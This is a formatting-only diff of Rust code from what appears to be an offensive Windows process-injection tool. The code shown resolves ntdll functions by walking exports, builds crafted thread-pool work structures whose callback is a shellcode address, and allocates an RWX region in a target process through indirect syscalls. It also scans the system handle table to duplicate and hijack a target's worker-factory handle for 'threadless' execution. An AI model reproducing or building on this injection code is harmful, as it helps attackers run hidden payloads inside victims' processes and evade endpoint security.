@@ -246,10 +246,10 @@ type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
 /// crafted `_TP_WORK` via the `WorkerFactoryTimeout` info class — the worker
 /// factory then arms the work item for the next scheduler pass.
 type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
-    *mut c_void, // WorkerFactoryHandle
-    u32,         // WorkerFactoryInformationClass
+    *mut c_void,   // WorkerFactoryHandle
+    u32,           // WorkerFactoryInformationClass
     *const c_void, // WorkerFactoryInformation (in)
-    u32,         // WorkerFactoryInformationLength
+    u32,           // WorkerFactoryInformationLength
 ) -> i32;
 
 /// `WorkerFactoryBasicTimer` info class for `NtQueryInformationWorkerFactory`.
@@ -591,18 +591,16 @@ unsafe fn threadless_resolve_syscalls() -> Result<
     String,
 > {
     let query_wf: NtQueryInformationWorkerFactoryFn = unsafe {
-        core::mem::transmute(resolve::export_addr(
-            b"ntdll.dll",
-            b"NtQueryInformationWorkerFactory",
+        core::mem::transmute(
+            resolve::export_addr(b"ntdll.dll", b"NtQueryInformationWorkerFactory")
+                .ok_or_else(|| String::from("ntdll!NtQueryInformationWorkerFactory missing"))?,
         )
-        .ok_or_else(|| String::from("ntdll!NtQueryInformationWorkerFactory missing"))?)
     };
     let set_wf: NtSetInformationWorkerFactoryFn = unsafe {
-        core::mem::transmute(resolve::export_addr(
-            b"ntdll.dll",
-            b"NtSetInformationWorkerFactory",
+        core::mem::transmute(
+            resolve::export_addr(b"ntdll.dll", b"NtSetInformationWorkerFactory")
+                .ok_or_else(|| String::from("ntdll!NtSetInformationWorkerFactory missing"))?,
         )
-        .ok_or_else(|| String::from("ntdll!NtSetInformationWorkerFactory missing"))?)
     };
     Ok((query_wf, set_wf))
 }
@@ -612,7 +610,13 @@ unsafe fn threadless_resolve_syscalls() -> Result<
 /// (direct_buf, work_buf, direct_offset, work_offset, region_size).
 fn threadless_build_structs(
     shellcode_addr: *mut c_void,
-) -> ([u8; TP_DIRECT_SIZE], [u8; TP_WORK_SIZE], usize, usize, usize) {
+) -> (
+    [u8; TP_DIRECT_SIZE],
+    [u8; TP_WORK_SIZE],
+    usize,
+    usize,
+    usize,
+) {
     // Both structs zero-initialized, then the load-bearing fields are set.
     let mut direct_buf = [0u8; TP_DIRECT_SIZE];
     // Callback = shellcode address (in the target's section view).
@@ -632,7 +636,13 @@ fn threadless_build_structs(
     // `direct` field value = address of the `_TP_DIRECT` in the target. We'll
     // patch it once the remote region address is known.
     // (placeholder 0; patched after alloc.)
-    (direct_buf, work_buf, direct_offset_in_region, work_offset_in_region, region_size)
+    (
+        direct_buf,
+        work_buf,
+        direct_offset_in_region,
+        work_offset_in_region,
+        region_size,
+    )
 }
 
 /// Allocate an RWX stub region in the target via the indirect-syscall wrapper.
@@ -663,7 +673,11 @@ unsafe fn threadless_alloc_region(
 }
 
 /// Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` address.
-fn threadless_patch_direct(work_buf: &mut [u8; TP_WORK_SIZE], remote_base: usize, direct_offset_in_region: usize) {
+fn threadless_patch_direct(
+    work_buf: &mut [u8; TP_WORK_SIZE],
+    remote_base: usize,
+    direct_offset_in_region: usize,
+) {
     let remote_direct_addr = remote_base + direct_offset_in_region;
     work_buf[TP_WORK_DIRECT_OFFSET..TP_WORK_DIRECT_OFFSET + 8]
         .copy_from_slice(&remote_direct_addr.to_le_bytes());
@@ -769,13 +783,13 @@ type NtQuerySystemInformationFn = unsafe extern "system" fn(
 
 /// `BOOL DuplicateHandle(HANDLE, HANDLE, HANDLE, HANDLE*, DWORD, BOOL, DWORD)`.
 type DuplicateHandleFn = unsafe extern "system" fn(
-    *mut c_void, // hSourceProcessHandle
-    *mut c_void, // hSourceHandle
-    *mut c_void, // hTargetProcessHandle
+    *mut c_void,      // hSourceProcessHandle
+    *mut c_void,      // hSourceHandle
+    *mut c_void,      // hTargetProcessHandle
     *mut *mut c_void, // lpTargetHandle (out)
-    u32,         // dwDesiredAccess
-    i32,         // bInheritHandle
-    u32,         // dwOptions
+    u32,              // dwDesiredAccess
+    i32,              // bInheritHandle
+    u32,              // dwOptions
 ) -> i32;
 
 /// Discover the target process's thread-pool worker factory by walking the
@@ -826,11 +840,10 @@ unsafe fn hijack_worker_factory(
 /// walk (no library load).
 unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateHandleFn), String> {
     let qsi: NtQuerySystemInformationFn = unsafe {
-        core::mem::transmute(resolve::export_addr(
-            b"ntdll.dll",
-            b"NtQuerySystemInformation",
+        core::mem::transmute(
+            resolve::export_addr(b"ntdll.dll", b"NtQuerySystemInformation")
+                .ok_or_else(|| String::from("ntdll!NtQuerySystemInformation missing"))?,
         )
-        .ok_or_else(|| String::from("ntdll!NtQuerySystemInformation missing"))?)
     };
     let dup_handle: DuplicateHandleFn = unsafe {
         core::mem::transmute(
@@ -844,10 +857,19 @@ unsafe fn hijack_resolve_fns() -> Result<(NtQuerySystemInformationFn, DuplicateH
 /// Size the handle table with a length-only query, fetch the full
 /// SYSTEM_HANDLE_INFORMATION_EX payload, and retry once at 2x when the table
 /// grew between the two queries (STATUS_INFO_LENGTH_MISMATCH).
-unsafe fn hijack_fetch_table(qsi: NtQuerySystemInformationFn) -> Result<crate::heap::Vec<u8>, String> {
+unsafe fn hijack_fetch_table(
+    qsi: NtQuerySystemInformationFn,
+) -> Result<crate::heap::Vec<u8>, String> {
     // ---- 1. Size the handle table with a length-only query ----
     let mut needed: u32 = 0;
-    let _ = unsafe { qsi(SYSTEM_EXTENDED_HANDLE_INFORMATION, core::ptr::null_mut(), 0, &mut needed) };
+    let _ = unsafe {
+        qsi(
+            SYSTEM_EXTENDED_HANDLE_INFORMATION,
+            core::ptr::null_mut(),
+            0,
+            &mut needed,
+        )
+    };
     if needed == 0 {
         // Fall back to a generous default if the kernel returned 0 (rare).
         needed = 0x10000;
@@ -985,9 +1007,8 @@ fn collect_target_handles(buf: &[u8], target_pid: u32, out: &mut crate::heap::Ve
         if entry + ENTRY_STRIDE > buf.len() {
             break;
         }
-        let pid = unsafe {
-            (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u64).read_unaligned()
-        };
+        let pid =
+            unsafe { (buf.as_ptr().add(entry + ENTRY_PID_OFF) as *const u64).read_unaligned() };
         if pid != target_pid as u64 {
             continue;
         }
@@ -1095,7 +1116,11 @@ mod tests {
         let mut tiny = crate::heap::Vec::new();
         collect_target_handles(&buf[..4], 0xDEADBEEF, &mut tiny);
         assert!(tiny.is_empty());
-        collect_target_handles(&buf[..HANDLES_OFF + ENTRY_STRIDE / 2], 0xDEADBEEF, &mut tiny);
+        collect_target_handles(
+            &buf[..HANDLES_OFF + ENTRY_STRIDE / 2],
+            0xDEADBEEF,
+            &mut tiny,
+        );
         assert!(tiny.is_empty());
     }
 }
